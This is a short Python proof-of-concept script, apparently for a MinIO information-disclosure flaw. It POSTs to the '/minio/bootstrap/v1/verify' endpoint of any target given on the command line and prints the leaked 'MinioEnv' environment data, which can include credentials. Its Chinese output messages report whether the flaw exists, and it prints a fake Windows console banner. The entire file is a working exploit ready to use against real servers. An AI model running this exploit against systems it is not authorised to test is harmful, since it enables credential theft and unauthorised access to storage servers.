#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/minio/bootstrap/v1/verify"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36"}
    r = requests.post(burp0_url, headers=burp0_headers, verify=False)
    jsondata = r.json()
    if "MinioEnv" in jsondata:
        return jsondata["MinioEnv"]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 minio-infoleak.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取敏感信息如下：", info)
    else:
        print("[-]漏洞不存在")
